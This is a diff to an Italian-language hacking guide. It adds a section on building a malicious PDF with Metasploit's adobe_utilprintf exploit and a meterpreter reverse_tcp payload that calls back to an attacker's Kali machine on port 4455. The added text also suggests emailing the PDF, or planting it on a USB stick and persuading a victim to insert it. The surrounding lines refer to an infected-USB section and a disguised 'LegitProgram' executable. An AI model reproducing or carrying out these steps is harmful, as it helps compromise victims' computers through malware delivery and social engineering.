@@ -105,6 +105,28 @@ chmod +x LegitProgram.1
 ./LegitProgram.1
 ```
 
+
+## Creare un documento PDF malevolo con Metasploit
+
+Lanciare Metasploit dal terminale digitando
+```
+msfconsole
+```
+Dopo di che possiamo creare un documento PDF malevolo con il seguente comando:
+
+```
+use exploit/windows/fileformat/adobe_utilprintf
+set FILENAME <nome da dare al documento PDF>
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST <IP Kali VM>
+set LPORT 4455
+show options
+exploit
+```
+Il documento PDF malevolo viene creato all'interno della cartella /root/.msf4/local/<nomefile>.pdf
+
+Potete inviare il documento PDF malevolo via email, o salvarlo su una chiavetta USB e convincere la vittima a inserire la chiavetta USB nel proprio PC.
+
 ## Creare Chiavetta USB infetta 
 
 Dal menu' principale di SET selezionare l'opzione 3) Infectious Media Generator.
